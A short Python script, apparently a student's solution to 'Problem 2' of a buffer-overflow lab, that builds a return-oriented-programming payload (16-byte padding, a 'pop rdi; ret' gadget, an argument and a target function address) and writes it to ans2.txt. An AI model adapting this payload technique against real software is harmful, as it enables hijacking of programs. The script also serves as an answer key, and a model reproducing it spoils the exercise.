import struct

# 修正后的 Gadget 地址 (pop rdi; ret)
pop_rdi_ret = 0x4012c7  
func2_addr = 0x401216
arg1_val = 0x3f8

# 偏移量: 16 bytes
padding = b'A' * 16

payload = padding + struct.pack('<Q', pop_rdi_ret) + struct.pack('<Q', arg1_val) + struct.pack('<Q', func2_addr)

with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Problem 2 payload written to ans2.txt")